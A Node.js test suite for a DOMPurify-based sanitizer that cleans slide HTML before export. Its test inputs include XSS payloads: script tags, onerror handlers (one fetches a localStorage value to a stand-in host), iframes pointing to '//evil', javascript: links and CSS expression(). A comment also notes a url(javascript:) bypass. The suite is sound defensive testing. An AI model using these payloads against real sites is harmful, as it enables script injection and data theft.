const test = require('node:test');
const assert = require('node:assert/strict');

// The shared slide-HTML sanitizer LOGIC (lib/core/sanitize-slide-html.mjs) —
// extracted from docs so the .html EXPORT assembler can share it (2026-07-07
// §Security 1). It is ESM (.mjs) with ZERO external imports (DOMPurify is injected
// by the host); this CJS test reaches it via dynamic import(). This suite covers
// the Node EXPORT path — a real jsdom-backed purifier — which is what the export
// must do (the docs vitest suite covers the browser binding + its window-less
// no-op in docs/src/lib/sanitize-slide-html.js).

let sani; // a real Node sanitizer over a jsdom window (the export path)
let mod; // the shared module namespace

test.before(async () => {
	mod = await import('../../../lib/core/sanitize-slide-html.mjs');
	const DOMPurify = (await import('dompurify')).default;
	const { JSDOM } = await import('jsdom');
	sani = mod.createSlideSanitizer(DOMPurify, new JSDOM('').window);
});

test('createSlideSanitizer strips script vectors (real sanitization in Node)', () => {
	assert.equal(sani('<script>steal()</script><p>ok</p>'), '<p>ok</p>');
	assert.doesNotMatch(sani('<img src=x onerror="fetch(\'//e/?\'+localStorage.k)">'), /onerror/i);
	assert.doesNotMatch(sani('<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>'), /onerror/i);
	assert.equal(sani('<iframe src="//evil"></iframe><p>ok</p>'), '<p>ok</p>');
	assert.doesNotMatch(sani('<a href="javascript:alert(1)">x</a>'), /javascript:/i);
});

test('createSlideSanitizer strips the legacy script-in-style vector but keeps url()', () => {
	assert.doesNotMatch(sani('<div style="width:expression(alert(1))">x</div>'), /expression/i);
	assert.match(sani('<div class="lattice-bg" style="background-image:url(\'/a.svg\')"></div>'), /url\(/);
	assert.match(sani('<span class="logo-mark" style="--logo-mask:url(\'/l.svg\')"></span>'), /--logo-mask:url\(/);
});

test('createSlideSanitizer preserves legitimate engine output (chart SVG, MathML, tables, del/ins)', () => {
	assert.match(sani('<svg class="lattice-chart"><rect width="4" height="4"/></svg>'), /<svg/);
	assert.match(sani('<table><thead><tr><th>a</th></tr></thead></table>'), /<table>/);
	assert.equal(sani('<del>old</del><ins>new</ins><sup>1</sup><sub>2</sub>'), '<del>old</del><ins>new</ins><sup>1</sup><sub>2</sub>');
	assert.match(sani('<section class="lattice-slide"><h2>T</h2></section>'), /<h2>T<\/h2>/);
});

test('createSlideSanitizer returns falsy input unchanged (no throw on empty)', () => {
	assert.equal(sani(''), '');
});

test('FORBID_TAGS covers the never-legitimate tags (regression pin)', () => {
	for (const t of ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input', 'base', 'link', 'meta']) {
		assert.ok(mod.FORBID_TAGS.includes(t), `FORBID_TAGS must include ${t}`);
	}
});

// ADD_ATTR — two SVG presentation attributes DOMPurify's default profile drops and the
// engine emits. Both were shipping stripped in every Studio artifact and exported player:
// `vector-effect` carries `non-scaling-stroke` on journey's sentiment curve, which without
// it scales ~77x under a non-uniform viewBox and paints the chart area as a solid slab;
// `dominant-baseline` is attribute-only on quadrant/radar/gantt/state-chart, and stripping
// it drops a centered label ~35% of its font-size. Reverting `ADD_ATTR` to `[]` previously
// left the whole unit suite green, so these pin it.
test('ADD_ATTR keeps the two presentation attributes the engine emits', () => {
	assert.match(sani('<svg><text dominant-baseline="central">x</text></svg>'), /dominant-baseline="central"/);
	assert.match(sani('<svg><path d="M0 0" vector-effect="non-scaling-stroke"/></svg>'), /vector-effect="non-scaling-stroke"/);
	for (const a of ['dominant-baseline', 'vector-effect']) assert.ok(mod.ADD_ATTR.includes(a), `ADD_ATTR must include ${a}`);
});

test('widening ADD_ATTR did not open a script vector', () => {
	// URI validation still applies to an ADD_ATTR attribute — a bare `javascript:` is caught.
	// (A `url(javascript:…)` wrapper is NOT caught, which is why the allowlist is restricted
	// to enumerated-keyword properties whose grammar never fetches — see the module comment.)
	assert.doesNotMatch(sani('<svg><text dominant-baseline="javascript:alert(1)">x</text></svg>'), /javascript:/);
	// The things that must stay shut, regardless of this widening.
	assert.doesNotMatch(sani('<svg><foreignObject><body>x</body></foreignObject></svg>'), /foreignObject/i);
	assert.doesNotMatch(sani('<svg><script>alert(1)</script></svg>'), /<script/i);
	assert.doesNotMatch(sani('<p onclick="alert(1)">x</p>'), /onclick/i);
});
